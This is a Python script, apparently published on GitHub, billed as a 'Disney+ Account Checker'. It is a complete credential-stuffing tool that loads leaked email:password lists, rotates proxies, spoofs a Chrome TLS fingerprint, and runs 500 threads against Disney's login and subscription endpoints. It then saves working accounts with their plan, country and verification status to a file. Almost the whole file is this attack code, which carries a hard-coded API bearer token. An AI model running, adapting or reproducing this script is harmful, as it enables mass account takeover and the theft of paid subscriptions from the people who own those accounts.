import os
import json
import time
import ctypes
import concurrent.futures

try:
    import requests
    import functools
    import pystyle
    import colorama
    import easygui
    import datetime
    import threading
    import tls_client
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install functools')
    os.system('pip install pystyle')
    os.system('pip install colorama')
    os.system('pip install easygui')
    os.system('pip install datetime')
    os.system('pip install threading')
    os.system('pip install tls_client')

from tls_client import Session
from requests.adapters import HTTPAdapter, Retry
from colorama import Fore
from pystyle import Write, System, Colors, Colorate
from threading import Lock
from random import choice

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pink = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET

valid = 0
invalid = 0
custom = 0
errors = 0
total_ver = 0

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

bad_proxies = []
locked_proxies = []
proxies = []
proxy_type = "http"
proxy_lock = Lock()
        
def disney_checker(email, password):
    global valid, invalid, custom, errors, total_ver
    retries = 1
    timeout = 10
    try: 
            ctypes.windll.kernel32.SetConsoleTitleW(f'H4cK3dR4Du Disney+ Account Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Verified Accounts : {total_ver} | Proxy Error : {errors} | https://github.com/H4cK3dR4Du')
            proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
            if len(open("./proxies.txt", "r").readlines()) != 0
            else None)
            session = Session(
                client_identifier="chrome_113",
                random_tls_extension_order=True
            )
            session.proxies = {
                "http": "http://" + proxy,
                "https": "http://" + proxy
            }

            payload = {
                "deviceFamily": "browser",
                "applicationRuntime": "chrome",
                "deviceProfile": "windows",
                "attributes": {}
            }
            headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
            }
            r = session.post('https://global.edge.bamgrid.com/devices', json=payload, headers=headers)
            if r.status_code == 403: 
                raise

            token = r.json()['assertion']
            payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={token}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice"
            headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/x-www-form-urlencoded" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
            
            r = session.post('https://global.edge.bamgrid.com/token', data=payload, headers=headers)
            if 'unauthorized_client' in r.text or 'invalid-token' in r.text: 
                raise

            auth_token = r.json()['access_token']
            headers = {
                    "accept": "application/json; charset=utf-8" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": f"Bearer {auth_token}" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json; charset=UTF-8" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
            }
            payload = {
                'email': email
            }

            r = session.post('https://global.edge.bamgrid.com/idp/check', headers=headers, json=payload)
            if "\"operations\":[\"Register\"]" in r.text:
                time_rn = get_time_rn()
                invalid += 1
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}-{gray}) {red}Invalid {reset}| {pink}{email}{reset}:{pink}{password}")
                return
            elif "\"operations\":[\"OTP\"]" in r.text:
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}/{gray}) {yellow}Custom {reset}| {pink}{email}{reset}:{pink}{password}")
                folder = "Checked"
                if not os.path.exists(folder):
                    os.makedirs(folder)
                custom += 1
                with open("Checked/custom_accs.txt", "a+", encoding='utf-8') as cum:
                    cum.write(f"{email}:{password} | A2F" + "\n")
                return
            elif "\"operations\":[\"Login\",\"OTP\"]" not in r.text: 
                raise

            headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": f"Bearer {auth_token}" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
            }
            payload = {
                'email': email,
                'password': password
            }

            r = session.post('https://global.edge.bamgrid.com/idp/login', json=payload, headers=headers)
            if 'Bad credentials sent for' in r.text or 'is not a valid email Address at /email' in r.text or "idp.error.identity.bad-credentials" in r.text:
                invalid += 1
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}-{gray}) {red}Invalid {reset}| {pink}{email}{reset}:{pink}{password}")
                return
            if 'token_type' not in r.text or 'id_token' not in r.text: 
                raise

            id_token = r.json()['id_token']
            payload = {
                'id_token': id_token
                }
            headers = {
                    "accept": "application/json; charset=utf-8" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": f"Bearer {auth_token}" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json; charset=UTF-8" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
            }

            r = session.post('https://global.edge.bamgrid.com/accounts/grant', json=payload, headers=headers)
            if 'Account archived' in r.text:
                invalid += 1
                return

            assertion = r.json()['assertion']
            payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount" 
            headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/x-www-form-urlencoded" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
            }
            r = session.post("https://global.edge.bamgrid.com/token", data=payload, headers=headers)

            access_token = r.json()['access_token']
            headers = {
                    "authorization": f"Bearer {access_token}" ,
                    "accept": "application/vnd.session-service+json; version=1" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "cache-control": "no-cache" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
            }
            r = session.get('https://global.edge.bamgrid.com/subscriptions', headers=headers)
            if r.text == '[]' or ("\"isActive\":false" in r.text and "\"isActive\":true" not in r.text):
                time_rn = get_time_rn()
                custom += 1
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}/{gray}) {yellow}Custom {reset}| {pink}{email}{reset}:{pink}{password}")
                folder = "Checked"
                if not os.path.exists(folder):
                    os.makedirs(folder)
                with open("Checked/custom_accs.txt", "a+", encoding='utf-8') as cum:
                    cum.write(f"{email}:{password} | A2F" + "\n")
                return
            elif "\"isActive\":true" not in r.text: 
                raise
            
            plan = r.text.split('name":"')[1].split('"')[0]
            re = session.get('https://global.edge.bamgrid.com/accounts/me',headers=headers)
            verified = re.text.split('emailVerified":')[1].split(',')[0]
            if verified == "true" or verified == True:
                total_ver += 1
            else:
                total_ver += 0
            country = re.text.split('country":"')[1].split('"')[0]
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}+{gray}) {green}Valid {reset}| {pink}{email}{reset}:{pink}{password}")
            folder = "Checked"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open("Checked/good_accs.txt", "a+", encoding='utf-8') as cum:
                cum.write(f"{email}:{password} | Plan : {plan} | Country : {country} | Verified : {verified}" + "\n")
            valid += 1
            return
    except:
        errors += 1

Write.Print(f"""
\t\t\t  _____  _                         _____ _               _             
\t\t\t |  __ \(_)                       / ____| |             | |            
\t\t\t | |  | |_ ___ _ __   ___ _   _  | |    | |__   ___  ___| | _____ _ __ 
\t\t\t | |  | | / __| '_ \ / _ \ | | | | |    | '_ \ / _ \/ __| |/ / _ \ '__|
\t\t\t | |__| | \__ \ | | |  __/ |_| | | |____| | | |  __/ (__|   <  __/ |   
\t\t\t |_____/|_|___/_| |_|\___|\__, |  \_____|_| |_|\___|\___|_|\_\___|_|   
\t\t\t                           __/ |                                       
\t\t\t                          |___/                                        

\t\t\t[    https://github.com/H4cK3dR4Du | https://discord.gg/hcuxjpSfkU     ]  
""", Colors.purple_to_blue, interval=0.000)
time.sleep(2)
print("\n\n\n")
accounts = []

with open('accounts.txt', 'r') as file:
    for line in file:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':')
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    disney_checker(email, password)

max_threads = 500

with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
    futures = [executor.submit(process_account, email, password) for email, password in accounts]
    concurrent.futures.wait(futures)
